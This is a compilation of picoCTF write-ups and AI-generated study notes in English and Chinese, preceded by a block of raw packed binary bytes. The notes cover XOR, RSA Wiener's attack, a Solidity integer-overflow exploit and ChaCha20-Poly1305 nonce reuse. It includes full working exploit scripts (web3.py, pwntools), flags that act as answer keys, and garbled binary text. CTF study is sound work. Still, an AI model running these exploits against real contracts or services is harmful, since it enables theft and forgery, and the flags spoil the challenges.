 _)öjXPH·   ­ƒàþA‰ÆV[‹HõÿÿÿD‹9L)ùE)÷IÎ_RPWQM)ÉAƒÈÿj"AZR^jZ)ÿj        XH‰D$PZS^­PH‰áI‰Õ­P­AH‰÷^ÿÕYH‹t$H‹|$jZj
XAÿå]è~ÿÿÿ/proc/self/exe    -  P     ÿÿÿåèJ ƒùIuDSWHL7ý^V[ë/H9Îs2V^ÿûÿÿ¬<€r
<w€~þt,è<wäV­(Ðuÿÿ¿ÿß_È)øØ«¬ëß[ÃXAVAWPH‰æHìþíÿÛ YT_j
YóH¥Hƒ> uøI‰þH«¶t³Ëü
öÿþßnÿõM)üºÿ7W^Œ{íjYX…ÀyÛoÿßjX‘ýI}ÿ° ªtÿó¤;ïÿoÛöÇ   =8>çøL‰ùH)á‰È1oÛ[þøƒðƒàÇo&8wøHÿíÿïÁé‰güK&‹Cü#HÁAY^_·íÖ¾X¯w¹âP3Åèè†ÿØÝjÄD$ [I‹µ ,íÍ`oeïèa e…Ûx¶ûîïÿÉA‰ØjYjZ¾÷)ÿè ‰ßè:}û…­_¾
ÿfø°        YÊ¶ÀÝ÷í¿ÕH= ðÿÿrÈÿÃ¹ò!¼ÏšîwoŽÎé1°<ë°î›¦i

 ë¼ÌÃ$vÿö…QwL‹GçJÿs
¿èÃÿÖ~ÛTÿSùÿtAg¸ÿÉIÿÀˆÛ7lo Æëé[WXÃAU…Õ^h·ÛATÌUÙýSƒì(½7¸Š„æD_$º        ¶[×ã–Q‹ÿ‹‹u¾ënÿþUPX!u/} 0µ&ë…öu¶ÿ»Á€B.9Æwò‰ÂH;wë
Hën·hslIT$}‹}¬Lë¶nDPÂÕRÆ^·vkîH_.u¸·!„{á·ÿÉ•Â1ÀM…ä À…ÂtŠþ _¶­}aw993u#NÉ5[·Ý5{DÔ@ÞEE_÷Í½Œ
‰ò·ÆèÛþºT[
[ÛlSÐHnbÿ·ÿ%Ä([]A\A]ÃÿAPtP@öÇuû/tÛJEu1W ÐñL9ÈuÿÁ1…íB8ë
/êu4¿ýîøë!Eu…ÉužÀt        M‰_‰ðß¶P! Aþ[Çë»^ø¡É±iWÖUmüUSxÜ¶oghLg @öa„$Nqk[k<`û@ö0Lû…›Ûi(L        "‹8Á·WtL        ÿmG
¿+xHfƒúu3‹ÞÑh»xÒp(©u>1Ò¹2ÛÂÇµ>¨H±ýf½¹ootÆ…¬*öé¤u¿Î @V8¹ž¸ ÿÛöÍÑpæDÈœÍKÛ1ÿƒÁ"ÿÊxý¶m!îfFj9èHBøÖÝ¸F#9Ã
Ø)Æ8ëÛÇ¶ðX‘åÃUë        ÃÁÛ°ý¶ãöÁ´ëæ
ÛVzíu^Ç¦+5÷-ÙEÈ³ Þèíü>íïïÔ¹¨¼I)îº8 Ça3l¼žaÀöq|!MXx{ t#<${IÕÜ†?½0¾Šòè8vé~*ëºnû"õs
I5(Agûÿná‹TT@bQsƒá ÁáÓl
¥7Øvƒd ]K/î¡á_ÙuC^IW èÕWI<2ØÃÙíÁ6CëÎs­ÍØZœ        á G÷p6}Ç‰úuâ1ò÷q£Ý–‰ð™)ÕP6“ûÓL,75&IX«-Ì2¤Bð.·ì—lû
cÙƒÊÿÎ´q÷u½<±¿ÐA…
Ÿn†‰ÁÈûm9Å£MÂ P k1ëJßÓ(õPÅ@7)ö‚ï—\¿tD‰éè÷Ùüá²î`ÛóªNý}„àÚSÂoÓöõQ¸Tÿì#ÈËöÞº        rÐ˜
îæºeIo;Ttõ
¼ôÞñJ0!Ø÷Ø%[aw:>Œß&„\1t-.ÿ¹"÷"pèAº_t\nî'÷èªúÔÔÃt78‰Ç·\Zºž„Çh…š&Ût¦õJ[Ú1þèüä"Œ!'$q(jìËÔÌu
L;&b¹çÞÀ'L)*’«è>ˆð—Û#(IÛ&G[[u¶`G8ÆÄ6$ÇÝ89Œ@í+6kkí0Mãnh{·ÐrýðA^A_)&XÎîÞ.+M™Õm@SW«Ô r5 ÃØÛ(¼$€ØtFëcÛÞtÐ˜8)Â<0.cÜm}6ÀMè[iÛº
PTá`Øx&ñ6Üº6(tèZê¾        µ{ÛÆLÂ÷!Äèî-[XÍŒ´)}„‘ñ»´ðñutÂ?}IûíðBCè`ù.¢xº DowéîÎè[H=GÃ¯Dw-I«JAS@C„c}†=¸ÁÞOÕ‹¾ „i.Ñ6·üøŸAZVÛiUEÅ
‚oÂŒ0a;H/àIF KŒÄ77åSRVWš[xP¿]à$K        ªt
 S
‹6èXlX0ÃòvƒvRYWVj*¾ÐDÍÆrðPWGñ¿ýÉOëN‹ îüÛŠóÃÿ·Ž¶€ðø/~Šv ƒýüwðm÷ðƒé‹¬‰sïM¼-ƒtH¼Ã}[Àµ
ñ;ü€úJ”N,MÚsôÔ—ÝÚÖÇYWu
gröÂÞâæA&ÿÈÀîÛÿEsÎƒèrÁà`¶Ò        Ð]oý¥BE”„õïÿÑ´cèr+ñîCë1r3²        #_É0²-ÚsâÒÇ"xà;n2ý ƒÑèåÀ0e+dÕìäÌ äŠ:ô>aìëÄu#ÿÁ<O–ÊèÖè>l•,ƒ¶ÂòHž¡àwó°•¹À>Á·È6mÄÁ€H÷Ûó´ÁèMýÀT      @ÿ   X         @ˆˆ’        ÿg
        É¨ª’  €      @ÿ\
        É¨ª’  €@      @ÿ¨  ˆ     ŽýÿÿGCC: (Ubuntu 15.2.0-4u4)ï²Á   ñÿÎ>vd         t! ï†°Á/  ƒ\Øð  lH¹3`Iwû–} @Ÿ U
 h=va/|G lÈÚØˆ/_/§¿d°!¶w ï„[l(º/p!S2r€­/Èì²Ñ¼h 
ÛÆ.ä/¿?{e±ú- 
@š!ä< .lÃ@XfÂGi{†°!û  G‚/•avû1Œ›/
6„
®Áw¿†°#Î/à C²í†ïGü;„É~ 4_²÷WGƒ´Ç·À/& CØ`#G5ÁNÉAë4l¤¡0FGXl°!kG©B lvÇ Ò] 7œ"ÿ…½ß·_
Ä Scrt1.oÿ­îÿ __abi_tag s½ff.c derÝkíegi
m_clones)díöíío_g
bal        tors9ux5ý{ûomple)d.0!_finÝ¾À¿`array_ery f
meuæ¾ ummy2
_)t®ýö„*hid‹nciphŠ—¼µÿ±sdFRAME_END

DYNl»»ICGNUHHDR®ýÿßGLOBAL_OFFSET_TABL}·øíee@IBC_2¥5utð[ÂÚchtMlibc_NÖn­ma—34‡m        ßITM_"C         û
…TG LsIÚÂÂvnad[+aWÖÐVs‰*m        »mBrtfCwmv†¬E_¡K°vÈn†llgm”À\k…o_-sšåD£µÛ­Û¿OdQ_u€d Þ[k!»;oc¢(TeÁ²kTbssr\Xß"openLro­q!Kg3e]0ƒk@,¹Ã[áECcxa
ñ        ·˜iz!!³†Û¾¼.sym…b $ +üö°h        noN.gnu.Fœ_"`›yžild-ØÍÐRap ™{k…=        dynT X»µJv#si–ÁÞÍM_µla(        Ûž{ÿtQ˜
,oÁmÍôgxØ`<Â-où.ehõn[öhdr
¨¥I-¤·ŸŽ
packe .m±%½ .Q¯;i35ÃÌhZ “NÄ `[á  ,ì`ƒ“P ÙYä.?JâÂ€ $Ã‹@g‹º°‡?¤ W°Y×öÿÿo?°ÃöÀ ¿;`†Scè ,ØÉ
°{?ë; [?7”]Ø˜ Õ¿cÙÂXÿ¿n ¿`Ý pþ?Ø
;˜ 0 ¿„Ã “?ÈXáÂ À?ÿö0v‰?×ˆ  ä² ?
;l°“— ²¡Œ?Ž? !
Ù… Ð/^ìÂÙ ™?ð ?
;²¡¢¿ vH†²À?«À ‡-°Ì? ±„
;d?Œ 
?a‡¤¡·   ÉPvh?¿h ’¡ìÂ <?ÍPÖ…¨  ÌìÂÉ×t!  …²¡å?”! `uCÙp?óÀ¼ `-¯ØW!» Ð?C ƒhh
rØ„û?pp
Xƒð¿7É‚pG¿¡ìd°? / c²ZØ?0¯ÍÙÏ0È ‡?‚
%?§
!‡?% l ‰8?`M˜‡¿°
        û Ð4»Èž ½¿?À"{v7 (?       ÿ    UPX!      UPX!(™”ÊZz¸@  ø  ¸@     Iô   
Q4: What commands did we use?
We used the pyhton command
Gemini:
Here is a structured learning write-up based on the Hidden Cipher 1 challenge from the CyLab Security Academy Challenge Library.

Challenge Write-Up: Hidden Cipher 1
Q1: Where was the flag hidden?
The flag was hidden inside a hex-encoded string returned by a netcat server terminal connection:
235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d07466656764b06422e
The underlying plaintext of this string was encrypted using a multi-byte, repeating XOR cipher.

Q2: What were the "tricky" parts of this challenge?
Lack of Source Code: The challenge provided the encrypted hex output directly from the terminal without immediately giving the decryption script or binary file.
The "Blind" Cipher: Without seeing the source code, it isn't explicitly clear what encryption algorithm is used (e.g., AES, Caesar, Vigenere, or XOR).
Repeating Key Length: Because it used a repeating key (S3Cr3t) rather than a single-byte XOR key, simple brute-force scripts targeting single characters would fail to yield readable text.

Q3: How did we successfully get the flag?
We successfully cracked the cipher by leveraging a Known Plaintext Attack (KPA) based on standard CTF flag formats.
Deducing the Format: We assumed the plaintext flag would begin with the platform standard prefix: picoCTF{.
Exploiting XOR Properties: Because XOR encryption is symmetrical ( ), XORing the known ciphertext bytes with our expected plaintext prefix (picoCTF{) exposed the repeating key pattern.
Isolating the Key: This mathematical comparison revealed the ASCII bytes for the repeating key: S3Cr3t.
Decryption: We wrote a short script to loop this 6-character key across the entire ciphertext string to reverse the encryption and print the flag.

Q4: What commands did we use?
Instead of manually translating every byte, we executed a single Python 3 one-liner inside the webshell terminal to automate the repeating XOR decryption:
Bash

python3 -c "
hex_str = '235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d07466656764b06422e'
key = 'S3Cr3t'
ciphertext = bytes.fromhex(hex_str)
flag = ''.join(chr(ciphertext[i] ^ ord(key[i % len(key)])) for i in range(len(ciphertext)))
print(flag)
"

Q5: Any mistakes or wrong paths explored?
Single-Byte Brute Forcing (Potential Trap): A common initial misstep in cryptography challenges is attempting a basic Caesar cipher shift or a single-byte XOR brute-force attack. Testing keys from 0x00 to 0xFF on the whole string results in garbage text because the key changes every 6 characters.
Over-complicating the Cipher: Assuming the challenge used complex asymmetric encryption (like RSA) or a modern block cipher (like AES-CBC) without first testing simple logical operators like XOR would have wasted valuable time. Checking for simple XOR relationships using the known flag format prevents over-engineering the solution.

Wayne:
Here is the flag you're looking for:
picoCTF{xor_unpack_4nalys1s_2c89add5}
How it was solved:
Using the webshell, I connected to the server via nc candy-mountain.picoctf.net 56286 and intercepted the encrypted message, which was output as a hexadecimal string (235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01176b0a221657412e).
Since the challenge hint pointed to an XOR cipher, I applied a known-plaintext attack using the standard flag format. By XORing the first few bytes of the hex string with picoCTF{, the repeating cipher key was revealed to be S3Cr3t.
XORing the entire hex string with this repeating key decrypts the full flag!

This document provides both a direct, copy-paste solution to the challenge and a detailed debrief to explain how it works.
CTF Challenge Learning Material: XOR Cipher Analysis
Q1: Where was the flag hidden?
The flag was stored on a remote server (candy-mountain.picoctf.net at port 56286). Upon connecting to this server, the flag was provided as an encrypted hexadecimal string: 235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01176b0a221657412e.
Q2: What were the "tricky" parts of this challenge?
Identifying the Encryption Method: Recognizing that the encryption was a repeating-key XOR cipher based on the challenge hints.
Applying a Known-Plaintext Attack (KPA): Knowing that PicoCTF flags always start with a predictable prefix (picoCTF{), which allows for reverse-engineering the key.
Key Cycle Management: Since the key is shorter than the ciphertext, the decryption script requires modulo arithmetic (i % len(key)) to loop the key repeatedly across the entire length of the ciphertext.
Data Accuracy: XOR ciphers are highly sensitive to data transcription. A single incorrect character in the hexadecimal string completely alters the derived key and the resulting plaintext.
Q3: How did we successfully get the flag?
Data Retrieval: Connected to the target server to receive the encrypted hexadecimal payload.
Key Extraction: Converted the hex string into bytes. XORed the first 8 bytes of the ciphertext with the known plaintext bytes (picoCTF{).
Formula: $Ciphertext \oplus Plaintext = Key$
Resulting key: S3Cr3t
Full Decryption: XORed the entire ciphertext using the repeating key S3Cr3t to reveal the full plaintext flag.
Formula: $Ciphertext \oplus Key = Plaintext$
Resulting flag: picoCTF{xor_unpack_4nalys1s_2c89add5}
Q4: What commands did we use?
Network Connection:
Bash

nc candy-mountain.picoctf.net 56286
Key Extraction & Decryption (Python):
Creating and executing a Python script in the terminal to handle the byte manipulation:
Bash

echo "import binascii; c = binascii.unhexlify('235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01176b0a221657412e'); k = b'S3Cr3t'; print(''.join(chr(c[i] ^ k[i % len(k)]) for i in range(len(c))))" > solve.py && python3 solve.py
Q5: Any mistake or wrong path did we explore?
Based on the terminal history, several errors occurred during the practical execution:
Hexadecimal Transcription Typo: In the initial Python commands, the ciphertext was copied with a typo in the first byte. It was inputted as 335a... instead of the correct 235a....
Incorrect Key Derivation: Because   (whereas  ), the typo caused the Known-Plaintext Attack to output an incorrect key: C3Cr3tS3.
Malformed Decryption Output: Using the incorrect key (C3Cr3tS3) against the corrupted ciphertext resulted in a garbled flag output (picoCTF{x.Y) ,0ug >c1s_2c89a%3).
Shell Command Syntax Errors: When attempting to run an inline Python command, multiple python3 -c "..." calls were concatenated together into a single block without proper shell operators (like ; or &&). The Python interpreter attempted to read the subsequent shell commands as Python code, resulting in a SyntaxError: invalid syntax.
June 16
Q1: Where was the flag hidden?
It was hidden inside the message
Q2: What were the "tricky" parts of this challenge? 
You have to have the correct code for solve.py and hVE THE RIGHT commands
Q5 any mistake or wrong path did we explore
I did the wrong command at the beginning...
📘 Challenge Post-Mortem: Small Trouble (RSA Cryptography)
Q1: Where was the flag hidden?
The flag was hidden mathematically within the encrypted ciphertext integer (c).
In RSA cryptography, the flag (the plaintext message  ) is obfuscated using a modular exponentiation formula:
 
Because the public modulus   and the public exponent   were known, the flag could only be unmasked by recovering the secret private exponent ( ) to compute:
 
Once recovered, the resulting integer   translates directly from hexadecimal bytes into ASCII/UTF-8 text containing the standard flag format.

Q2: What were the "tricky" parts of this challenge?
The primary "trick" of this challenge lay in its name vs. its parameters:
The Misdirection: The challenge is named "Small Trouble", which usually hints at a small public exponent (like  ), allowing for a simple cube-root attack. However, looking at the actual parameters,   was a massive integer, nearly the same size as  .
The True Vulnerability: Because   was so large, it meant that the private exponent   was actually the value that was exceptionally small. When an RSA public key is generated with a small private exponent   to speed up decryption times, it leaves the system vulnerable to Wiener's Attack.
The Mathematical Threshold: Wiener's Attack perfectly applies here because   satisfies the condition:
 

Q3: How did we successfully get the flag?
We successfully cracked the ciphertext by implementing Wiener's Attack using Continued Fractions.
Approximation: The algebraic relationship in RSA dictates that  . When   is very small,   is extremely close to  , meaning  .
Continued Fractions Expansion: We computed the continued fractions expansion of the public fraction   to produce a list of close fractions called convergents.
Sifting for  : The script iterated through these convergents ( ) to test if the denominator   successfully cracked the RSA keys.
Decryption: Once the correct private exponent   was identified, we computed   and converted the resulting large integer back into readable text bytes to reveal the flag.

Q4: What commands did we use?
To run the attack properly inside the environment, we utilized standard Linux shell and file editing commands:
nano solve.py Used to open the terminal-based text editor (nano) and create a script file named solve.py to house our multi-line Python logic safely.
python3 solve.py Used to execute the script in the Python 3 runtime environment, handling the heavy mathematical operations and printing the decoded string directly to the terminal output.

Q5: Any mistakes or wrong paths did we explore?
Yes, we hit a very instructive execution bottleneck during the initial phase of solving:
The Shell Syntax Error: The initial mistake was attempting to copy and paste Python script code (like variable assignments n = ..., function definitions, and for loops) directly into the raw Bash terminal prompt.
Why it failed: Linux shells like bash do not natively interpret Python syntax. Line breaks and indentation structures in Python conflict with how Bash sequences commands, leading to a cascade of -bash: syntax error near unexpected token errors.
The Correction: We corrected this by pivoting away from the raw command line and properly isolating the logic inside a dedicated script file (solve.py), allowing the Python interpreter to handle the syntax flawlessly.
他俩还没做出来呢，在做的
Smart_Overflowhttps://learn.cylabacademy.org/library/760?page=1&search=Smart_Overflow:
Luna
The overflow part is hard.To overflow it, you need to reach the limti.


🎉🎉🎉🎉🎉🎉!SUCCESS!🎉🎉🎉🎉🎉🎉(forever! (only for this flag))


Of course! Here is a complete, one-stop, English-language guide. It combines the complete, working solution (with the corrected code) and the educational post-challenge analysis into a single document. This is your "everything you need" material for this challenge.

WayneComplete Guide for PicoCTF: Integer Overflow Challenge


Section 1: The One-Click Solution (Commands & Code)
This section contains all the commands you need to execute in your webshell terminal.
Important Prerequisite: Get Your Challenge Details
Before you begin, go to the PicoCTF challenge page and find the "More details can be found at here" link. Click it to find your specific instance's details. You will need to copy the following two pieces of information:
Your Private Key (e.g., 0x777...)
The Contract Address (e.g., 0x6D8...)

Step-by-Step Instructions
Execute these commands in your webshell terminal in order:
Step 1: Install Dependencies
This command installs web3.py, the essential Python library for interacting with the Ethereum blockchain.
Bash

pip3 install web3
Step 2: Generate the Final Solution Script
This command uses a "heredoc" (cat << 'EOF' > solve.py ... EOF) to automatically create a file named solve.py. Crucially, you must replace the placeholders for your private key and contract address within this command before running it.
Copy the entire block below and paste it into your terminal, replacing the two placeholders with your actual details:
Bash

cat << 'EOF' > solve.py
import sys
from web3 import Web3

# ==============================================================================# IMPORTANT: REPLACE THESE WITH THE DETAILS FROM YOUR CHALLENGE INSTANCE# ==============================================================================
PRIVATE_KEY = "<YOUR_PRIVATE_KEY>"  # Replace with your Private Key from the picoCTF page
CONTRACT_ADDRESS = "<YOUR_CONTRACT_ADDRESS>"  # Replace with the Contract Address from the picoCTF page# ==============================================================================# The RPC URL is specific to this challenge and is already filled in for you.
RPC_URL = "http://mysterious-sea.picoctf.net:50175"# ==============================================================================# Connect to the Ethereum node
web3 = Web3(Web3.HTTPProvider(RPC_URL))

# Check connectionif not web3.is_connected():
    print("❌ Failed to connect to the Ethereum node. Please check the network or wait 5 minutes for the server to spin up.")
    sys.exit(1)

# Set up the account from the private key
account = web3.eth.account.from_key(PRIVATE_KEY)
print(f"[*] Account loaded: {account.address}")

# Define the contract's ABI (the interface to its functions)
abi = [
    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
]

# Create the contract object
contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)

# Define a helper function to send signed transactions
def send_tx(tx_build):
    tx_build['nonce'] = web3.eth.get_transaction_count(account.address)
    signed_tx = web3.eth.account.sign_transaction(tx_build, PRIVATE_KEY)
    # Corrected 'raw_transaction' for web3.py v7 compatibility
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[*] Transaction sent: {tx_hash.hex()}. Waiting for confirmation...")
    web3.eth.wait_for_transaction_receipt(tx_hash)
    print("[+] Transaction confirmed!\n")

# --- Step 1 of the Exploit: Set Balance to uint256 Max ---print(">>> Step 1: Deposit uint256 max, pushing balance to its limit...")
max_uint256 = 2**256 - 1
tx1 = contract.functions.deposit(max_uint256).build_transaction({
    'from': account.address,
    'gas': 2000000,
    'gasPrice': web3.to_wei('10', 'gwei')
})
send_tx(tx1)

# --- Step 2 of the Exploit: Trigger the Overflow ---print(">>> Step 2: Deposit 2, triggering integer overflow...")
tx2 = contract.functions.deposit(2).build_transaction({
    'from': account.address,
    'gas': 2000000,
    'gasPrice': web3.to_wei('10', 'gwei')
})
send_tx(tx2)

# --- Step 3 of the Exploit: Read the Flag ---print(">>> Step 3: Reading the Flag...")
flag = contract.functions.getFlag().call()
print(f"🎉 Flag successfully retrieved: {flag}")
EOF
Step 3: Run the Script and Get the Flag
Run the final command in your terminal. The script will automatically send the transactions and print the flag.
Bash

python3 solve.py

Section 2: Post-Challenge Analysis & Learning Material (Debrief)
This section breaks down the "why" and "how" of the challenge, providing the educational context.
Q1: Where was the flag hidden?
The flag was hardcoded and stored on the Ethereum blockchain within a "private" variable (string private flag) inside the deployed IntOverflowBank contract. Since it was private, it could not be read directly from the blockchain's state. The only way to access it was by satisfying a specific condition to call the contract's getFlag() function. The successfully retrieved flag is: picoCTF{Sm4r7_0verFl0ws_ExI5t_a14a9783}.
Q2: What were the "tricky" parts of this challenge?
The challenge was based on a classic security vulnerability in old smart contracts: Integer Overflow.
Outdated Solidity Version: The contract uses pragma solidity ^0.6.12;. In versions of Solidity before 0.8.0, arithmetic operations that exceeded a variable's maximum size did not throw an error. Instead, they would "wrap around" to zero, similar to how a car's odometer resets after reaching its maximum value. This allowed an attacker to create mathematically impossible conditions.
Counter-Intuitive Condition: The critical flaw was in the deposit function's check: if (!revealed && balances[msg.sender] < amount). In normal math, your new balance after a deposit can't be smaller than the deposit amount itself. However, by intentionally overflowing the balance, we could make this check succeed.
Q3: How did we successfully get the flag?
We wrote a Python script using the web3.py library to exploit the overflow vulnerability in three steps:
Step 1: Set Up the Balance. We made a "deposit" of 2256 - 1, the maximum possible value for a uint256. This set our balance in the contract to this enormous number.
Step 2: Trigger the Overflow. We made a second "deposit" of only 2. The addition (max_uint256 + 2) overflowed the uint256 storage, causing it to wrap around to 1. The script then checked the condition: is the new balance (1) smaller than the deposit amount (2)? Yes! The condition was met, and the revealed variable was set to true, unlocking the flag.
Step 3: Read the Flag. We called the now-unlocked getFlag() function to read the hardcoded flag.
Q4: What commands did we use?
We used several key Linux and Python-related commands:
cat << 'EOF' > solve.py ... EOF: A herdoc command to create the solve.py file with the correct code directly in the terminal, preventing copy-paste errors for multi-line scripts.
pip3 install web3: Installs the web3.py library, a Python dependency needed to interact with the Ethereum blockchain via JSON-RPC.
python3 solve.py: Executes the Python script to automate the entire exploit.
Q5: Did we make any mistakes or explore wrong paths?
Yes, and this was a key part of the real-world problem-solving process!
Incorrect Tooling: An early mistake was trying to use a command-line web tool (wget mysterious-sea.picoctf.net:65379) to connect to the node. This failed because it's an Ethereum RPC node that only accepts specific JSON-RPC requests, not regular file-download commands. We had to pivot to using a dedicated library like web3.py.
Terminal Interference: The challenge text was accidentally pasted into the terminal, causing command not found errors. We had to use Ctrl + C to clear the terminal state and start fresh.
Dependency Handling & Library Compatibility: This was a major point. While the logic was correct, the solve.py script initially failed with an AttributeError. This was because the user's webshell installed the very latest version (v7) of web3.py, which renamed the rawTransaction attribute to raw_transaction to follow Python styling guidelines. The original code from Turn 1 used the old name. We quickly identified this from the error log and provided a corrected script that uses the modern raw_transaction method, which is what is in the guide above.
这是一份为你量身定制的 CTF 赛后复盘与学习资料，它总结了我们刚才攻克 PicoCTF 智能合约题目的全过程。你可以将它保存下来作为以后的学习笔记！

智能合约漏洞复盘：Integer Overflow (整数溢出)
Q1: Where was the flag hidden? (Flag 藏在哪里？)
Flag 被硬编码隐藏在以太坊测试网上的一个名为 IntOverflowBank 的智能合约的私有变量 string private flag 中。
它无法被直接读取，唯一获取它的方式是满足特定条件后，调用合约的 getFlag() 视图函数。最终我们成功拿到的 Flag 是：picoCTF{Sm4r7_0verFl0ws_ExI5t_a14a9783}。
Q2: What were the "tricky" parts of this challenge? (这道题的“坑点/难点”是什么？)
这道题的核心难点和巧妙之处在于利用旧版 Solidity 的整数溢出（Integer Overflow）机制来绕过逻辑检查：
版本老旧： 合约使用的是 pragma solidity ^0.6.12;。在 Solidity 0.8.0 之前，如果没有使用 SafeMath 库，当变量超过其能表示的最大值时，它不会报错，而是会静默绕回（Wrap around），就像汽车里程表爆表后从零开始一样。
反直觉的条件判定： 触发 Flag 揭示的条件是 if (!revealed && balances[msg.sender] < amount)。在正常的加法运算中，你的余额（balance）加上充值金额（amount），新余额绝对不可能小于充值金额。但在溢出漏洞下，这是可以被打破的。
环境交互： 题目没有提供传统的 Web 界面，需要参赛者自己编写代码（如 Python 的 web3.py 库）直接与以太坊 RPC 节点进行 RPC 调用和交易签名。
Q3: How did we successfully get the flag? (我们是如何成功拿到 Flag 的？)
我们通过编写 Python 自动化脚本，向智能合约发送了三笔关键交易/调用，完美利用了溢出漏洞：
第一步（撑爆余额）： 我们调用 deposit 函数，存入 uint256 的最大极限值（ ）。此时，我们在该合约中的余额变成了这个巨大的天文数字。
第二步（触发溢出）： 我们再次调用 deposit，这次存入金额 2。原本极大的余额加上 2 后，超过了 uint256 的存储上限，发生溢出，余额重新从 0 开始计算，变成了 1。此时，合约执行检查：新余额 (1) 确实小于本次充值的金额 (2)。条件被满足，revealed 被标记为 true。
第三步（读取胜利果实）： 权限解锁后，我们调用 getFlag() 函数，成功读取到了 Flag 字符串。
Q4: What commands did we use? (我们使用了哪些命令？)
在整个解题过程中，我们在 Linux Webshell 终端中使用了以下关键命令：
cat << 'EOF' > solve.py ... EOF：利用 heredoc 语法，一次性将包含我们私钥和节点信息的 Python 漏洞利用脚本写入并保存为 solve.py 文件。
pip3 install web3：使用 Python 包管理器安装 web3.py，这是与以太坊区块链进行交互的核心依赖库。
sed -i 's/rawTransaction/raw_transaction/g' solve.py：这是一个流编辑器命令，用于全局替换文件中的文本。我们用它快速修复了代码中因 web3 库版本更新导致的方法名变更问题。
python3 solve.py：执行我们编写好的 Python 脚本，自动化完成交易签名、发送和读取过程。
Q5: Any mistake or wrong path did we explore? (我们探索过程中犯了哪些错或走了哪些弯路？)
这是一次非常真实的黑客排错过程，我们遇到并解决了以下几个小插曲：
误用 Web 工具请求 RPC： 一开始尝试使用 wget mysterious-sea.picoctf.net:65379。由于该地址是以太坊的 RPC 节点，只接受特定的 JSON-RPC 格式请求，不支持像普通网页那样去下载，因此遭遇了 Connection refused。
终端输入干扰： 曾不小心将大段的题目文本提示直接复制粘贴到了终端命令行里，导致终端疯狂报错 command not found。后续通过 Ctrl + C 中断并清理了终端状态。
未找到关键凭证： 刚开始不知道如何与链交互，没注意到 PicoCTF 网页上的 "here" 链接。后来在页面中找到了专属的 Private Key（私钥）和 Contract Address（合约地址），这才是打开大门的钥匙。
库版本兼容性报错 (AttributeError)： 在最后执行脚本时，遇到了 AttributeError: 'SignedTransaction' object has no attribute 'rawTransaction'。这是因为通过 pip 安装的是最新的 web3 v7 版本，新版本为了符合 PEP8 规范，将驼峰命名改为了下划线命名。我们通过 sed 命令快速修正了拼写，最终一击命中。
Secret Box:
Too much context, don't know which one.
ChaCha Slide https://learn.cylabacademy.org/library/493?page=2&difficulty=3
Here is how you can understand this hacking challenge, explained like you are a spy trying to pull off a heist!
🕵️‍♂️ The Setup: The Robot Guard
Imagine a super-smart robot guard protecting a secret prize (the Flag). To talk to this guard, you have to use a highly advanced secret code called ChaCha20-Poly1305.
This code does two very important things:
The Invisible Ink (Encryption): It scrambles your message so nobody else can read it.
The Wax Seal (Authentication): It puts a special, unbreakable wax seal on the message. If anyone tries to mess with the message, the seal breaks, and the guard knows it's a fake.
🚨 The Golden Rule (and The Mistake)
To make this code unbreakable, the guard has one massive rule: You must use a brand new, random "ticket number" (called a Nonce) for every single message.
But... the programmer who built the guard got lazy. They programmed the guard to use the exact same ticket number for multiple messages. In the hacking world, this is a huge mistake!
💻 How We Hacked It (Step-by-Step)
Because the guard reused the ticket number, the whole security system fell apart. Here is how we tricked it:
Step 1: Stealing the Ink recipe
Since the guard used the same ticket number, it also used the exact same pattern of "invisible ink" to scramble the messages. The guard accidentally showed us a normal message and its scrambled version. By comparing the two, we easily reverse-engineered the ink pattern!
Step 2: Writing a Fake Note
Now that we knew exactly how the ink worked, we used it to scramble our own fake message: "But it's only secure if used correctly!" * Step 3: Forging the Wax Seal (The Hard Part)
This was the trickiest part of the challenge. Even though our message was scrambled correctly, the guard would still check the wax seal. However, because the guard reused the ticket number, the math behind the wax seal became a solvable puzzle. We used a special math program (Python with a library called SymPy) to crack the puzzle and forge a perfect, fake wax seal for our new message.
Step 4: Claiming the Prize
We handed our completely fake message—with its perfectly forged wax seal—to the guard. The guard scanned the seal, thought it was 100% real, read our message, and handed over the secret Flag! 🚩
🧠 The Big Lesson
Even the most powerful, military-grade secret codes in the world become completely useless if you don't follow their rules. Never reuse your Nonce!
Modern authenticated-encryption ciphers like ChaCha20-Poly1305 are great, but they can quickly fall apart if their limits aren't respected. Can you violate the integrity of a message encrypted by this program?



import pwn
from sympy import Symbol, GF, Poly

# Hide extra warning messages so we only see what's important
pwn.context.log_level = 'error'

# The address of the "Robot Guard" we are trying to trick
HOST = "activist-birds.picoctf.net"
PORT = 65433

# A giant prime number used in the "Wax Seal" (Poly1305) math puzzle
P = 2**130 - 5

def get_poly_coeffs(ct):
    """
    Think of this as chopping our message into small, equal-sized blocks.
    The guard uses these blocks to calculate the final 'Wax Seal'.
    """
    aad_len = 0
    ct_len = len(ct)
    
    # Add extra padding (zeros) so the message fits perfectly into 16-byte chunks
    pad_ct = ct + b'\x00' * ((16 - ct_len) % 16)
    mac_data = pad_ct + aad_len.to_bytes(8, 'little') + ct_len.to_bytes(8, 'little')
    
    coeffs = []
    for i in range(0, len(mac_data), 16):
        block = mac_data[i:i+16]
        # Add a special '0x01' marker to each block, as required by the guard's rules
        val = int.from_bytes(block, 'little') + (1 << 128)
        coeffs.append(val)
    return coeffs

def poly_eval(coeffs, r_val):
    """
    This does the actual math for the 'Wax Seal'.
    It takes our message blocks and a secret key (r_val) and mixes them together.
    """
    acc = 0
    for c in coeffs:
        acc = (acc + c) * r_val % P
    return acc

def solve():
    # Connect to the target server (The Robot Guard)
    io = pwn.remote(HOST, PORT)
    
    # --- SPYING ON THE GUARD ---
    # The guard gives us the first message and its scrambled (encrypted) version
    io.recvuntil(b"Plaintext (hex): ")
    pt1 = bytes.fromhex(io.recv
Explaining the Thought Chain (English for a 13-Year-Old)
To explain this to a 13-year-old, you can structure the thought process as a sequence of identifying obstacles and finding the right tools to bypass them. Here is a framework you can use directly:
Phase 1: The Speed Problem (Why we need pwntools)
The Observation: "Every time we connect to the server, it generates a brand new secret key and a new ticket number (Nonce). If we disconnect to do our math, the target changes."
